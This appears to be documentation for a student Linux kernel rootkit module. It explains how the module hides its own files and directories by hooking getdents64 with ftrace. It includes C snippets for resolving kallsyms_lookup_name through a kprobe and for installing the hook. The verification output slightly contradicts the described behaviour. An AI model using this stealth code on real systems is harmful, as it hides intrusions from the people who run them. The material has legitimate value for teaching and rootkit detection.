---
title: Hide Files & Directories
description: Hooks getdents64 via ftrace to remove the rootkit directory from any directory listing.
---

**Optional · 2 pts**

Hooks `getdents64` via ftrace to remove the rootkit directory from any directory listing.

## How it works

Every tool that lists files — `ls`, `find`, `stat` — eventually calls the **`getdents64`** system call. The hook intercepts it in two ways:

1. **Directory-level hide** — if the file descriptor points to a directory in `hidden_dirs[]` (matched by inode), the hook returns `0` immediately, making the directory appear completely empty.
2. **Entry-level hide** — for all other directories, the hook lets the real `getdents64` run, copies the buffer to kernel space, removes any entry whose `d_name` starts with a prefix in `hide_prefixes[]`, then writes the filtered buffer back to userland.

## Why ftrace instead of CR0 patching

The classic rootkit approach — clearing the **WP (Write Protect)** bit in CR0, then patching the syscall table directly — **failed on our Arch Linux VM** for two cumulative reasons:

**`CONFIG_STRICT_KERNEL_RWX`** is enabled by default on recent Arch Linux kernels. This option configures the MMU to enforce kernel page permissions independently of CR0. Even with the WP bit cleared, any write to a page marked read-only by the MMU triggers an immediate **page fault** that panics the kernel.

```
[  42.317] BUG: unable to handle page fault for address: ffffffffc0a3e120
[  42.317] #PF: supervisor write access in kernel mode
[  42.317] #PF: error_code(0x0003) - permissions violation
```

**ftrace** is the correct alternative. The kernel compiles every function with a `call __fentry__` instruction at the very start of its body. ftrace uses these slots to inject callbacks without touching read-only pages — it writes through `text_poke()`, which uses a temporary writable mapping and is fully compatible with `CONFIG_STRICT_KERNEL_RWX`.

```
__x64_sys_getdents64:
  call __fentry__     ← ftrace redirects here to our callback
  push rbp
  ...
```

## Symbol resolution — `get_symbol()`

Since kernel **5.7**, `kallsyms_lookup_name()` is no longer exported. It is recovered via a kprobe: after `register_kprobe()`, the `kp.addr` field holds its real address, which can then be called as a regular function to resolve any other kernel symbol.

```c
static unsigned long get_symbol(const char *name)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    typedef unsigned long (*kln_t)(const char *);
    kln_t kln;

    if (register_kprobe(&kp))
        return 0;

    kln = (kln_t)kp.addr;
    unregister_kprobe(&kp);
    return kln(name);
}
```

Used in `hide_files_init()` to locate `__x64_sys_getdents64` and `__x64_sys_read` at module load time.

## ftrace hook structure

Each hook follows the same three-element architecture:

**1. Pointer to the original function** — saved to call the real syscall from inside the hook without infinite recursion.

```c
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
```

**2. ftrace callback** — receives the signature imposed by ftrace. It redirects `regs->ip` to our hook only if the caller does not come from our own module (`within_module` guard), preventing infinite recursion when the hook calls the original.

```c
static void notrace ftrace_callback(unsigned long ip,
                                     unsigned long parent_ip,
                                     struct ftrace_ops *ops,
                                     struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook_getdents64;
}
```

**3. `ftrace_ops` structure** — declares the callback and its flags:

```c
static struct ftrace_ops getdents64_ops = {
    .func  = ftrace_callback,
    .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY,
};
```

`FTRACE_OPS_FL_SAVE_REGS` is required to have a valid `pt_regs` in the callback. `FTRACE_OPS_FL_IPMODIFY` is required to allow modifying `regs->ip`.

## `hook_getdents64` — full flow

```
ls /
  → hook intercepts
      → fd inode in hidden_dirs[] ? → return 0 (empty)
      → otherwise: call orig_getdents64 → copy buffer to kernel
          → for each dirent entry:
              → name starts with "wlkom" or "rootkit" ? → remove (memmove)
          → copy_to_user filtered buffer, return new size
```

## Initialization and cleanup

**`hide_files_init()`** — called from `wlkom_init()`:
1. For each path in `hidden_dirs[]`, resolves the inode via `kern_path()` and saves it in `hidden_inodes[]` with `igrab()` (increments refcount so the inode stays valid even if the directory is unmounted)
2. Resolves `__x64_sys_getdents64` via `get_symbol()`
3. Configures `getdents64_ops` and installs the hook via `ftrace_set_filter_ip()` + `register_ftrace_function()`
4. Repeats steps 2–3 for `__x64_sys_read`

**`hide_files_exit()`** — called from `wlkom_exit()`:
1. Releases inode references with `iput()` for each entry in `hidden_inodes[]`
2. Unregisters both hooks via `unregister_ftrace_function()` and clears filters

:::caution[Cleanup is critical]
If the module is unloaded while ftrace is still trying to call a callback whose code no longer exists in memory, the result is an immediate kernel panic. Proper cleanup in `hide_files_exit()` is mandatory.
:::

## Configuration

| Constant | Role |
|----------|------|
| `hide_prefixes[]` | Entry name prefixes removed from `getdents64` results |
| `hidden_dirs[]` | Directories that appear completely empty |
| `hide_lines[]` | Line markers filtered in `read()` (see Hide Lines) |

## Verification

```sh
$ ls /
bin  boot  dev  etc  home  lib  ...
# /rootkit is not listed

$ ls /rootkit
# ls: cannot access '/rootkit': No such file or directory

$ find / -name "wlkom.ko" 2>/dev/null
# no output
```
